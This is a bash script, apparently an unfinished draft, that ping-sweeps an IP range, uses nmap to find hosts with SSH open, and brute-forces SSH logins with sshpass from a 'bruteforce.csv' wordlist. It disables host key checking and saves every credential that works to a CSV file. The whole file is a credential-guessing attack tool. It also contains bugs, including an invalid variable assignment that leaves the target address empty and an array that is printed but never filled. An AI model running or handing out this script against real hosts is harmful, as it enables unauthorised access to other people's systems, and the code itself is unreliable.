# start_ip=172.17.9.199
# end_ip=172.17.9.202

read -p "Enter start IP address (e.g., 172.17.9.199): " start_ip
read -p "Enter end IP address (e.g., 172.17.9.202): " end_ip

IFS='.' read -r -a start_ip_parts <<< "$start_ip"
IFS='.' read -r -a end_ip_parts <<< "$end_ip"

online_ips=()
csv_file="result_ips.csv"
# Loop through the IP addresses in the range and ping each one
for ((i=${start_ip_parts[3]}; i<=${end_ip_parts[3]}; i++)); do
    current_ip="${start_ip%.*}.$i"
    ping -c 1 -W 1 $current_ip > /dev/null
    if [ $? -eq 0 ]; then
        online_ips+=("$current_ip")
        # echo "$current_ip is online"
    fi
done
wait
for online_ip in "${online_ips[@]}"; do
  echo "$online_ip"
done

open_ssh_ips=()
for ip in "${online_ips[@]}"; do
  echo "Scanning IP address: $ip"
#   nmap -Pn -T4 -F "$ip"  # Adjust nmap options as needed
  if nmap -p 22 "$ip" | grep "open" ; then
    # open_ssh_ips+=("$ip")
    open_ssh_ip = "$ip"
    echo "SSH port is open on $open_ssh_ip"
    while IFS=$'\t' read -r username password; do
      echo "Trying username: $username on $open_ssh_ip"
      for pw in $password; do
        if sshpass -p "$pw" ssh -o StrictHostKeyChecking=no "$username@$open_ssh_ip" "exit"; then
          echo "Found valid credentials: IP: $open_ssh_ip, Username: $username, Password: $pw"
          #i want to save open_ssh_ip , username and password in csv_file 
          echo "$open_ssh_ip, $username, $pw" >> "$csv_file"
          break
        fi
      done 
    done <bruteforce.csv 
  fi
done

echo "============="
for open_ssh in "${open_ssh_ips[@]}"; do
  echo "$open_ssh"
done

